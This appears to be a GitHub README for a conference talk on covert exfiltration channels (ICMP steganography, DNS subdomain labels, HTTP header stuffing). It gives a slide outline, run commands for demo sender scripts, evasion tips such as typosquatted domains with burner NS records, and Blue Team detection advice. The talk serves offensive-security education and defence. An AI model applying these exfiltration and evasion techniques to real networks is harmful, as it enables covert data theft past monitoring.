# Living off the Wire: Covert Channels in Enterprise Networks

**Talk materials — slides, demo scripts, and references for the LeHack 2024 presentation on ICMP, DNS, and HTTP covert channel techniques in modern enterprise environments.**

[![Conference](https://img.shields.io/badge/conference-LeHack%202024-blueviolet?style=flat-square)]()
[![Date](https://img.shields.io/badge/date-2024--06--28-blue?style=flat-square)]()
[![License](https://img.shields.io/badge/license-CC%20BY%204.0-lightgrey?style=flat-square)](LICENSE)

---

## Talk

| Field | Detail |
|---|---|
| **Conference** | LeHack 2024 — Paris, Cité des Sciences |
| **Date** | 2024-06-28 |
| **Duration** | 45 min + 15 min Q&A |
| **Track** | Red Team / Offensive |
| **Language** | French |
| **Slides** | [PDF](slides/lehack2024-covert-channels.pdf) · [Keynote source](slides/lehack2024-covert-channels.key) |
| **Recording** | [YouTube — LeHack 2024 channel](https://www.youtube.com/@lehack) *(available ~2 weeks post-event)* |
| **Abstract** | See below |

---

## Abstract

Enterprise DLP and proxy solutions are built around L7 application inspection: HTTP/S, SMTP, FTP. ICMP, DNS, and high-frequency HTTP headers fall into a visibility gap — inspected for content at most by NDR appliances, ignored entirely by most SIEMs and DLP products.

This talk walks through three covert channel techniques used in real Red Team engagements against hardened corporate environments: ICMP steganography (XOR into OS ping patterns with TTL mimicry), DNS exfiltration via subdomain labels, and HTTP header stuffing using non-standard but tolerated headers. For each technique, we cover the implementation, the evasion properties, and — critically — what mature Blue Teams can and cannot detect. We finish with a live demo exfiltrating a 1 MB file over each channel from a fully-monitored network segment.

---

## Repository Contents

```
.
├── slides/
│   ├── lehack2024-covert-channels.pdf       Exported slides (speaker notes included)
│   └── lehack2024-covert-channels.key       Keynote source (editable)
│
├── demo/
│   ├── 01-icmp/
│   │   ├── README.md                        Setup and run instructions
│   │   ├── icmp_sender.py                   XOR steganography into Linux ping pattern
│   │   └── icmp_receiver.py                 Listener + reassembly
│   │
│   ├── 02-dns/
│   │   ├── README.md
│   │   ├── dns_exfil.py                     File → base32 chunks → DNS labels
│   │   └── dns_server.py                    Authoritative NS catching subdomains
│   │
│   └── 03-http/
│       ├── README.md
│       ├── http_sender.py                   Payload in X-Custom-* headers, chunked
│       └── http_receiver.py                 Flask endpoint, header reassembly
│
└── references/
    └── bibliography.md                      All sources cited in the talk
```

---

## Demo Prerequisites

All three demos require two machines (or two Docker containers) on the same network or with DNS resolution:

```bash
# Install dependencies (attacker machine)
pip install scapy requests flask dnslib

# For ICMP demo: raw sockets
sudo python3 demo/01-icmp/icmp_sender.py --target <receiver_ip> --file secret.txt

# For DNS demo: control an NS record pointing to receiver IP
# (or run both scripts on isolated lab network — demo/02-dns/README.md for setup)

# For HTTP demo: no root required
python3 demo/03-http/http_receiver.py &
python3 demo/03-http/http_sender.py --target http://localhost:5000 --file secret.txt
```

Demo scripts are for **educational and authorized testing only**. They are deliberately kept simple (no encryption, no auth) to make the technique visible during a live demo.

---

## Slides Outline

```
01  Introduction — Why covert channels still work in 2024
02  Threat model — what the enterprise network actually monitors
03  DLP blind spots — ICMP, DNS, HTTP headers: why they're ignored

04  Technique 1 — ICMP Steganography
      OS ping pattern anatomy (Linux timeval / Windows alphabet)
      XOR embedding — stays within payload bounds
      TTL mimicry via setsockopt(IP_TTL)
      Fragment strategy — N × 64B packets vs oversized single packet
      Live demo — exfil /etc/passwd over ICMP
      Detection: entropy scoring, fragment magic byte, volume anomaly

05  Technique 2 — DNS Exfiltration
      Label encoding (base32 → valid hostname chars)
      Chunk size constraints (63 chars/label, 253 chars/FQDN)
      Rate limiting — avoid DNS flood signatures
      Live demo — exfil over authoritative NS query log
      Detection: subdomain entropy, query rate per FQDN, NXDOMAIN ratio

06  Technique 3 — HTTP Header Stuffing
      Which headers are passed through by corporate proxies
      X-Forwarded-For chaining, X-Custom-* tolerance
      Chunked reassembly at receiver
      Live demo — exfil via Burp-intercepted HTTPS session
      Detection: non-standard header name ratio, header count anomaly

07  Comparative analysis
      Bandwidth, detectability, implementation complexity
      What each technique looks like under Wireshark / Zeek / Darktrace

08  Blue Team takeaways
      Signatures worth writing (Suricata / Sigma / Zeek)
      What NDR products actually catch today
      Recommended monitoring gaps to close

09  Q&A
```

---

## Key Points (Talk TL;DR)

- **ICMP**: most enterprise SIEMs don't feed ICMP to correlation rules at all. The blind spot is structural, not a configuration oversight. NDR (Vectra, Darktrace) catches volume anomalies but not single-session low-bandwidth exfil. Entropy scoring can flag it but generates high FP rates on legitimate tools.
- **DNS**: the highest-bandwidth covert channel of the three — 63 chars/label × multiple labels × query rate = practical for real exfil. Widely documented (iodine, dnscat2) but still effective because most orgs don't monitor internal DNS recursion logs. Typosquatted domain + burner NS record = near-zero detection on a first engagement.
- **HTTP headers**: lowest detection risk against proxy-based DLP because the proxy passes the headers through transparently. The tradeoff: limited capacity, requires an attacker-controlled HTTP endpoint the proxy will forward to.

---

## References

Full annotated bibliography in [references/bibliography.md](references/bibliography.md). Key sources cited in the talk:

| Cited as | Source |
|---|---|
| [1] Pingback (ICMP C2, 2021) | Trustwave SpiderLabs — levelblue.com |
| [2] PingPull / GALLIUM (ICMP C2, 2022) | Unit42 / Palo Alto Networks |
| [3] ICMP DLP blind spot | DeepStrike — deepstrike.io/blog/what-is-icmp-tunneling |
| [4] DNS exfil — iodine | kryo.se/iodine — Björn Andersson |
| [5] DNS exfil detection | Cisco Umbrella — umbrella.cisco.com/blog/dns-tunneling |
| [6] HTTP covert channel | OWASP Testing Guide — owasp.org |
| [7] Zeek HTTP header analysis | docs.zeek.org/en/master/scripts/base/protocols/http |
| [8] Entropy analysis for ICMP | Trisul Analytics — trisul.org/blog |

---

## License

Slides and demo scripts are licensed under [CC BY 4.0](LICENSE) — share and adapt with attribution.

---

## Contact

[![ProtonMail](https://img.shields.io/badge/ProtonMail-8B89CC?style=flat-square&logo=protonmail&logoColor=white)](mailto:contact@franckferman.fr)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/franckferman)
[![X](https://img.shields.io/badge/X-000000?style=flat-square&logo=x&logoColor=white)](https://www.twitter.com/franckferman)
